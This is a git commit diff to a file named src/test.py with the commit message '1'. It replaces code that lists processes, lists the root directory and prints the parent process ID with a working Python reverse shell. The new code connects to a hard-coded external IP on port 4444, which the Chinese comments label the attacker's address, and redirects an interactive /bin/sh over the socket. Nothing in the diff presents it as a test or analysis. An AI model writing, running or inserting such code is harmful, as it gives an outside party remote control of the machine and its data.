57aef3850ce6bf0f636f1e6d764f62ffd7755d2f
r5 <r5@>
2025-06-14 21:31:47 +0800

    1

--- src/test.py
+++ src/test.py
@@ -1,36 +1,18 @@
-import os
+import socket
 import subprocess
+import os
 
-
-def get_process_list():
-    # 使用ps命令获取进程列表
-    try:
-        out = subprocess.check_output(['ps', 'aux'], text=True)
-    except Exception as e:
-        out = f"Error getting process list: {e}"
-    return out
-
-def get_root_file_list():
-    # 获取根目录下的文件和目录列表
-    try:
-        files = os.listdir('/')
-        files_str = '\n'.join(files)
-    except Exception as e:
-        files_str = f"Error getting root file list: {e}"
-    return files_str
-
-def get_parent_pid():
-    ppid = os.getppid()
-    print(f"Parent Process ID (PPID): {ppid}")
+# 配置外网主机IP和端口
+REMOTE_HOST = "172.237.65.250"   # 攻击者IP，需替换
+REMOTE_PORT = 4444        # 攻击者监听端口，需替换
 
 def main():
-    process_list = get_process_list()
-    # root_files = get_root_file_list()
-    # data = f"Process List:\n{process_list}\n\nRoot Directory Files:\n{root_files}"
-    print("Process List:")
-    print(process_list)
-    get_parent_pid()
-
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((REMOTE_HOST, REMOTE_PORT))
+    os.dup2(s.fileno(), 0)  # stdin
+    os.dup2(s.fileno(), 1)  # stdout
+    os.dup2(s.fileno(), 2)  # stderr
+    subprocess.call(["/bin/sh", "-i"])
 
 if __name__ == "__main__":
     main()
